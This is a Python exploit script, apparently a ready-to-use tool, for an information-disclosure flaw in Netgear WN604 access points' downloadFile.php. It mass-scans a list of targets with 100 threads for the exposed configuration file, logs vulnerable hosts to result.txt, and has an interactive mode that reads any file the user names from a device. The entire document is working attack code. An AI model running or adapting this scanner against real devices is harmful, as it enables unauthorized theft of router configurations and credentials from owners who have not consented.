import argparse,requests,sys,json,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()


def banner():
    text = """██╗    ██╗██╗   ██╗        ██╗  ██╗██╗   ██╗
██║    ██║██║   ██║        ██║  ██║██║   ██║
██║ █╗ ██║██║   ██║        ███████║██║   ██║
██║███╗██║██║   ██║        ██╔══██║██║   ██║
╚███╔███╔╝╚██████╔╝███████╗██║  ██║╚██████╔╝
 ╚══╝╚══╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ 
                  author='wuhu'
                  version=1.1.1                          """
    print(text)


def main():
    banner()
    parser = argparse.ArgumentParser(description="Netgear WN604 downloadFile.php 信息泄露漏洞")
    parser.add_argument('-u','--url',type=str,dest='url',help='please input your url')
    parser.add_argument('-f','--file',type=str,dest='file',help='please input your file')
    args = parser.parse_args()
    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        file_url = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                file_url.append(url.strip())
        mp = Pool(100)
        mp.map(poc,file_url)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")


def poc(target):
    payload = '/downloadFile.php?file=config'
    try:
        res1 = requests.get(url=target+payload,verify=False,timeout=5)
        # print(res1.text)
        if 'system' in res1.text:
            print(f'[+]{target}存在漏洞')
            with open('result.txt','a') as fp:
                fp.write(target+'\n')
        else:
            print(f'[-]{target}不存在漏洞')
        return True
    except:
        pass


def exp(target):
    cmd = input("请输入你要读取的文件名")
    payload1 = '/downloadFile.php?file='+cmd
    res1 = requests.get(url=target+payload1,verify=False,timeout=5)
    print(res1.text)


if __name__ == "__main__":
    main()